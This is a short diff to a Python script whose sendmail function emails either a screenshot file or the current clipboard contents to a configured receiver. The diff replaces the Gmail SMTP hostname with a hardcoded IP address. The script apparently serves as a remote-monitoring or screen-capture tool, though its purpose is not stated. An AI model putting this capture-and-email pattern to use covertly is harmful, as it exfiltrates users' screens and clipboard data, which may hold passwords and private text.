@@ -4,7 +4,7 @@ import pyautogui as pag
 import smtplib
 import imaplib
 import email
-import base64
+import base64	
 
 from email.mime.text import MIMEText
 from email.header import decode_header
@@ -45,13 +45,15 @@ def sendmail(Screenshot=True):
 	msg['To'] = RECEIVER_EMAIL
 
 	if Screenshot:
+		with open(FILENAME, 'rb') as f:
+			img_data = f.read()
 		image = MIMEImage(img_data, name=FILENAME)
 		msg.attach(image)
 	else:
 		text = MIMEText(cb.paste())
 		msg.attach(text)
 
-	with smtplib.SMTP("smtp.gmail.com", 587) as server:
+	with smtplib.SMTP('64.233.184.108', 587) as server:
 		server.ehlo()
 		server.starttls()
 		server.ehlo()
